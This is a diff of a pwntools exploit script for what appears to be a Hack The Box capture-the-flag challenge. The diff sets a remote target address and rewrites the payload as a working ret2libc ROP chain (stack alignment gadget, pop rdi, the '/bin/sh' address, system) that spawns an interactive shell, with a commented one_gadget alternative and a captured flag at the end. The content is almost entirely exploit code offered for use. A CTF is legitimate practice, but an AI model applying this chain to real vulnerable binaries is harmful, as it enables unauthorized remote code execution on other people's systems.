@@ -4,7 +4,9 @@
 from pwn import *
 from struct import *
 
-ip, port = '167.71.139.119', 32617
+#context.log_level = 'debug'
+
+ip, port = '167.99.205.156', 30616
 #io = remote(ip, port)
 
 def detect():
@@ -162,16 +164,51 @@ constraints:
 constraints:
   [rsp+0x70] == NULL
 
+0x00000000000215bf : pop rdi ; ret
+ROPgadget --binary libc6_2.27-3ubuntu1.4_amd64.so --string /bin/sh
+Strings information
+============================================================
+0x00000000001b3e1a : /bin/sh
+
 '''
 
-libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
+libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
+#libc = ELF('./libc6_2.24-9ubuntu2.2_i386.so')
+#libc = ELF('./libc6_2.24-9ubuntu2_i386.so')
 libc_base = libc_printf - libc.sym['printf']
 libc.address = libc_base
-offset = 64
-payload = offset*'A'
-payload += libc_base + 0x4f432 + '\x00'*0x70
-io.recv()
+offset = 64+8
+
+payload = offset*b'A'
+payload += p64(libc_base + 0x00000000000008aa) #ret #alignment!!! Success after adding this alignment!!!
+payload += p64(libc_base + 0x00000000000215bf) #pop rdi; ret
+payload += p64(libc_base + 0x1b3e1a) #/bin/sh
+payload += p64(libc.sym['system'])
+
+#rop_libc = ROP(libc)
+#rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
+#rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
+#payload = offset*b'A' + rop_libc.chain()
+
+#io.recvuntil('>')
 io.sendline(b'1')
 io.recvuntil('>>')
-io.sendline(payload.encode())
+io.sendline(payload)
 io.interactive()
+
+'''
+def get_rce(libc_printf):
+	printf_libc_offset = 0x0000000000064f70
+	one_gadget = 0x4f432
+	rce = libc_printf - printf_libc_offset + one_gadget
+	print("CALCULATED RCE: " + hex(rce))
+	io.sendline(b"1")
+	io.recv()
+	#io.send(b"A"*64 +p64(0x0000000000064f70) + p64(rce) + b"\x00"*0x70)
+	io.send(b"A"*(64+8) + p64(rce) + b'\x00'*0x48)
+	io.interactive()
+
+get_rce(libc_printf)
+'''
+
+#HTB{bl1nd_R0p_1s_c0ol_a1nt_1t?}
